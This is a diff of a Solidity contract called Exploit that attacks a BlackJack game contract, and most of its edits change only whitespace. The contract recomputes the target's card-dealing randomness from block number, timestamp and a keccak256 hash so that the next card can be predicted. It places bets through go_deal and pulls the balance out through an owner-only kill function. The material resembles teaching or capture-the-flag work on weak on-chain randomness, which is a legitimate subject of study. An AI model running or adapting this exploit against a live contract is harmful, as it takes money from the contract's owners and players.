@@ -43,20 +43,24 @@ Exploit
         BlackJack target;
         address owner;
 
+
         function Exploit(address _target) payable{
             target = BlackJack(_target);
             owner = msg.sender;
         }
     
+    
         function deal(address player, uint8 cardNumber) returns (uint8) {
 		      uint b = block.number;
 		      uint timestamp = block.timestamp;
 		      return uint8(uint256(keccak256(block.blockhash(b), player, cardNumber, timestamp)) % 52);
-	      }
+	}
+    
     
         function go_deal(uint256 _amount) public{
           target.deal.value(_amount)();
         }
+    
     
         //@para card_num is the number you want for next card
         //@para cardsDealt is how many card you already have
@@ -67,10 +71,10 @@ Exploit
             }
         }
         
+	
         function kill() public{
           require(msg.sender == owner);
           msg.sender.send(this.balance);
         }
-        
-        
+  
     }
